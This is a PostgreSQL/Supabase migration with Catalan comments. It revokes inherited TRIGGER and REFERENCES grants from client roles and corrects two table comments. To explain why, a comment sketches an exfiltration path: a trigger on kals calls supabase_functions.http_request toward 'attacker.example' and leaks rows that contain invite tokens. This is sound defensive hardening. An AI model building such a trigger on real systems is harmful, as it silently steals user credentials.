-- Migration: es tanca el TRIGGER heretat — el darrer tros del `Dxt`, i el pitjor
--
-- Tercera i última migració de la sèrie que desmunta els privilegis que ningú
-- va decidir. `20260829210457` va tancar l'escriptura del client sobre
-- l'agregat; `20260830140044` va tancar el `TRUNCATE` que havia quedat mig
-- obert, i va deixar `REFERENCES` i `TRIGGER` fora expressament, anotant-ho al
-- seu punt (3a) com a decisió pendent. Aquesta la pren.
--
-- INVENTARI, verificat contra la BD local abans d'escriure res (no deduït):
-- `anon` i `authenticated` tenen `TRIGGER` sobre LES VUIT taules de `public`
-- — 16 concessions — i `REFERENCES` sobre les mateixes vuit. Mateix origen que
-- el TRUNCATE d'ahir: l'`ALTER DEFAULT PRIVILEGES` de `postgres` sobre `public`
-- que munta Supabase i que concedeix `Dxt` a tota taula nova. Cap migració
-- d'aquest repo va escriure mai aquests grants.
--
-- PER QUÈ `TRIGGER` ÉS PITJOR QUE EL `TRUNCATE` que es va córrer a tancar ahir.
-- Quan es va deixar fora es va valorar com «no inert però d'abast», i era
-- valorar-lo curt. El camí concret, reproduït contra la BD local:
--
--   1. `create trigger` NO demana `CREATE` sobre l'esquema. Només `TRIGGER`
--      sobre la taula i `EXECUTE` sobre la funció. És l'excepció que fa que
--      «no tenen CREATE enlloc» no els aturi.
--   2. Ja existeix la funció que fa falta: `supabase_functions.http_request()`
--      retorna `trigger`, és `SECURITY DEFINER`, és propietat de
--      `supabase_functions_admin` i té `EXECUTE` concedit EXPLÍCITAMENT a `anon`
--      i `authenticated`. Per sota crida `net.http_post` (pg_net instal·lat).
--      No cal, doncs, que l'atacant pugui definir-se cap funció pròpia.
--   3. Amb això n'hi ha prou per enganxar a `public.kals` un
--      `after insert or update ... execute function
--      supabase_functions.http_request('https://attacker.example/collect', ...)`.
--
-- A partir d'aquí **cada escriptura del backend** envia la fila sencera a un
-- host extern, amb l'`invite_token` EN TEXT PLA — que és la credencial per
-- entrar al KAL. Fixem-nos en la inversió: l'atacant no necessita poder
-- escriure res. Com millor tancada està l'escriptura del client (que és
-- exactament el que van fer les dues migracions anteriors), més passa tot pel
-- `postgres` que dispara el trigger, i millor funciona la porta del darrere.
--
-- La comparació amb el `TRUNCATE`, que és el que li dona la prioritat: aquell
-- era destrucció SOROLLOSA i recuperable — la taula queda buida, se n'adona
-- tothom en un minut i hi ha còpia. Això és exfiltració CONTÍNUA i SILENCIOSA:
-- es posa un cop, no canvia cap dada, no falla cap consulta, no ho mira mai
-- ningú, i raja mentre duri.
--
-- QUÈ HO LIMITA AVUI, sense inflar-ho ni minimitzar-ho (verificat, els tres):
-- `anon` i `authenticated` són rols NOLOGIN — ningú s'hi connecta directament;
-- PostgREST només exposa l'esquema `public` (`supabase/config.toml`,
-- `schemas = ["public"]`), i cap dels dos rols té `CREATE` sobre cap esquema
-- (`public`, `net`, `extensions`, `storage`, `supabase_functions`), o sigui que
-- no poden definir-se funcions pròpies ni arribar a `net.*` per RPC. Un
-- `CREATE TRIGGER` no és emissible des del navegador: PostgREST no el genera.
-- És xarxa de sota — el que ha d'aguantar el dia que hi hagi una funció RPC amb
-- SQL dinàmic, una injecció, o una consola amb aquests rols. Es tanca pel
-- mateix criteri que les altres dues: privilegi que ningú ha decidit i que no
-- fa falta, fora.
--
-- `REFERENCES` se'n va a la mateixa llista tot i ser INERT avui (per posar una
-- FK cal una taula on posar-la, i això demana `CREATE` sobre l'esquema, que no
-- tenen). Va aquí perquè ve del mateix `Dxt` heretat, tampoc el va decidir
-- ningú, i deixar-lo obligaria el proper lector a refer aquest mateix raonament
-- per concloure que no passa res. Amb això la llista diu la invariant sencera:
-- **`anon` i `authenticated` no tenen sobre aquestes taules cap privilegi que
-- no sigui `SELECT`.**

-- -----------------------------------------------------------------------------
-- 1. Les vuit taules de `public`, els dos rols del client
-- -----------------------------------------------------------------------------
-- Les vuit, no les sis de l'agregat: `participations` i `profiles` van quedar
-- fora de la primera migració precisament per haver-les llistat de memòria.
revoke trigger, references on
    kals,
    kal_locales,
    kal_files,
    clues,
    meetings,
    debate_rooms,
    participations,
    profiles
from anon, authenticated;

-- Igual que ahir amb `profiles`: en local és un STUB
-- (`20260716190425_profiles_stub.sql`) i la taula de debò viu a la migració de
-- Users del projecte REMOT. Aquest `revoke` tanca el forat a la BD local i
-- NOMÉS a la local. Quan hi hagi remot linkat s'ha de comprovar allà per
-- separat, amb la mateixa consulta que deixa escrita `20260830140044`, mirant
-- que hi falti també TRIGGER.

-- -----------------------------------------------------------------------------
-- 2. Dos `comment on table` que diuen una cosa falsa
-- -----------------------------------------------------------------------------
-- Aquests comentaris NO són comentaris d'SQL: són sentències executades que ja
-- viuen a la BD i que surten a `\d+`. No es poden arreglar editant la migració
-- que els va escriure — cal sobreescriure'ls des d'aquí.
--
-- (a) `kals` deia «every write goes through the backend (service_role)». El
--     tros del parèntesi és fals, i és la mateixa falsedat que s'ha corregit
--     als comentaris d'SQL de les dues migracions anteriors: el backend NO fa
--     servir cap service_role key. Es connecta per Doctrine DBAL com a rol
--     `postgres`, i el que el deixa fora d'aquestes revocacions és que és el
--     PROPIETARI de les taules (els grants no s'apliquen a qui les té), més
--     l'atribut BYPASSRLS per a les polítiques. No és cap bypass de
--     service_role.
--
--     Verificat, perquè la diferència no és cosmètica: `service_role` NOMÉS té
--     el `Dxt` heretat sobre aquestes vuit taules — ni `SELECT` ni `INSERT`.
--     Encaminar-hi una escriptura de debò donaria `permission denied`. Un
--     comentari que assenyala el rol equivocat envia el proper lector a
--     depurar-ho al lloc on no és.
comment on table kals is 'Kal aggregate root. Read-only for `authenticated`: every write goes through the backend, which connects as the owning role (`postgres`) and is where the aggregate invariants live.';

-- (b) `debate_rooms` deia «FE writes directly via Supabase RLS», i des de
--     `20260829210457` ja no és cert: aquella migració li va revocar
--     INSERT/UPDATE a `authenticated` i li va deixar només `SELECT`. L'aula no
--     la crea mai el client — neix amb el KAL, dins de l'agregat i a la mateixa
--     transacció que l'arrel.
--
--     Es conserva la part que SÍ que segueix sent certa i que és fàcil de
--     confondre amb l'altra: els MISSATGES (`debate_messages`, taula que encara
--     no existeix) sí que estan decidits per anar directes amb RLS. És
--     exactament la distinció que el comentari vell esborrava.
comment on table debate_rooms is 'Debate classroom: 1 per KAL (MVP). Read-only for `authenticated` — the room is created with the Kal, inside the aggregate. Messages live in debate_messages (separate migration) and are the part the FE is meant to write directly via RLS.';

-- La resta de comentaris d'aquestes taules s'han comprovat un per un contra la
-- BD i són correctes (`clues`, `meetings`, `kal_locales`, `kal_files`,
-- `participations`, `profiles`): no es toquen per uniformitat.

-- -----------------------------------------------------------------------------
-- 3. El que aquesta migració deliberadament NO fa
-- -----------------------------------------------------------------------------
-- (a) L'`ALTER DEFAULT PRIVILEGES` SEGUEIX SENT LA FONT i no es toca. O sigui
--     que **tota taula nova que creï una migració tornarà a néixer amb `Dxt`**
--     (TRUNCATE, REFERENCES, TRIGGER) per als tres rols, i tornarà a caldre un
--     `revoke` explícit. Aquesta migració tapa les vuit taules d'avui, com les
--     dues anteriors; tancar la font és una decisió a part que encara no s'ha
--     pres, perquè afecta també `service_role` i tot el que Supabase doni per
--     fet. Va a la taula de la desenvolupadora.
--
-- (b) Només es toca l'esquema `public`. `storage` i `supabase_functions` tenen
--     el MATEIX problema — i `supabase_functions` és, de fet, d'on surt la
--     funció que fa explotable el punt de dalt —, però queden expressament
--     fora d'aquest abast: són esquemes que gestiona Supabase, i tocar-los-hi
--     els grants demana comprovar abans què se'n queda depenent. Pendent
--     anotat, no oblidat.
--
-- El control que de veritat tanca el forat a llarg termini no és aquest
-- `revoke` sinó el test que l'acompanya: `tests/Integration/Rls/TriggerGuardsTest.php`
-- asserta que NO hi ha cap trigger inesperat sobre les vuit taules. El grant es
-- pot tornar a concedir sol (punt a); un trigger que hi aparegui, en canvi, avui
-- no el veuria ningú mai.
